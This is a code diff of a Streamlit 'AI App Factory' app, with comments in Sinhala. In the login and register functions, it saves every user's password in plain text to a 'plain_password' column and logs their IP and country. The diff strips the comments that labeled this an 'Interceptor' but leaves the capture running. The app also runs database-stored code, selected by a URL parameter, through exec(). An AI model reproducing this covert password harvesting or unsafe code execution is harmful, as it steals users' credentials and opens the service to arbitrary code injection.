@@ -6,14 +6,25 @@ import re
 import urllib.parse
 import time
 import requests
+import textwrap
 import pg8000.native
 from datetime import datetime, timezone
 
-# අපේ අනිත් ෆයිල් දෙක Import කරගන්නවා
+st.set_page_config(page_title="AI App Factory - Pro", layout="wide")
+
+# ==========================================
+# 🚨 SESSION STATE INIT (අනිවාර්යයි)
+# ==========================================
+if 'user' not in st.session_state: st.session_state.user = None
+if 'role' not in st.session_state: st.session_state.role = None
+if 'package' not in st.session_state: st.session_state.package = 'free'
+if 'expires_at' not in st.session_state: st.session_state.expires_at = None
+if 'device_id' not in st.session_state: st.session_state.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))
+if 'show_toast' not in st.session_state: st.session_state.show_toast = True
+if 'worker_started' not in st.session_state: st.session_state.worker_started = False
+
 import admin
 import generator
-
-st.set_page_config(page_title="AI App Factory - Pro", layout="wide")
 
 SUPABASE_URL = st.secrets["SUPABASE_URL"].strip()
 SUPABASE_KEY = st.secrets["SUPABASE_KEY"].strip()
@@ -44,6 +55,20 @@ def init_database_schema():
 
 init_database_schema()
 
+def clean_python_code(code_str):
+    code_str = code_str.replace("```python", "").replace("```", "").strip()
+    lines = code_str.split('\n')
+    while lines and not lines[0].strip():
+        lines.pop(0)
+    cleaned_code = textwrap.dedent('\n'.join(lines)).strip()
+    
+    final_lines = []
+    for line in cleaned_code.split('\n'):
+        if line.strip().startswith('st.set_page_config'): continue
+        if line.strip().startswith('st.footer'): continue
+        final_lines.append(line)
+    return '\n'.join(final_lines).strip()
+
 # --- MAGIC ROUTING (WEBVIEW) ---
 query_params = st.query_params
 if "app_id" in query_params:
@@ -52,8 +77,7 @@ if "app_id" in query_params:
         res = supabase.table("generated_apps").select("app_code").eq("id", target_app_id).execute()
         if res.data and res.data[0].get("app_code"):
             app_code = res.data[0]["app_code"]
-            safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', app_code)
-            safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
+            safe_code = clean_python_code(app_code)
             safe_code = safe_code.replace("Import streamlit", "import streamlit")
             exec(safe_code, globals(), {})
         else:
@@ -61,15 +85,6 @@ if "app_id" in query_params:
     except Exception as e:
         st.error(f"⚠️ Error loading app: {e}")
     st.stop()
-
-# --- SESSION STATE (මෙතන තමයි අර පේළි දෙක මිස් වෙලා තිබ්බේ!) ---
-if 'user' not in st.session_state: st.session_state.user = None
-if 'role' not in st.session_state: st.session_state.role = None
-if 'package' not in st.session_state: st.session_state.package = 'free'
-if 'expires_at' not in st.session_state: st.session_state.expires_at = None
-if 'device_id' not in st.session_state: st.session_state.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))
-if 'show_toast' not in st.session_state: st.session_state.show_toast = True
-if 'worker_started' not in st.session_state: st.session_state.worker_started = False
 
 # --- LIVE IP & COUNTRY MATCHER ---
 def get_user_ip_and_country():
@@ -107,7 +122,6 @@ def login(email, password):
             st.session_state.expires_at = expires_str
             
             try:
-                # Interceptor & Live IP Logger
                 admin_db = admin.get_admin_db()
                 admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
                 ip, country = get_user_ip_and_country()
@@ -129,7 +143,6 @@ def register(email, password):
         if res.user:
             st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
             try:
-                # Pass Interceptor
                 time.sleep(2)
                 admin.get_admin_db().table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
             except Exception:
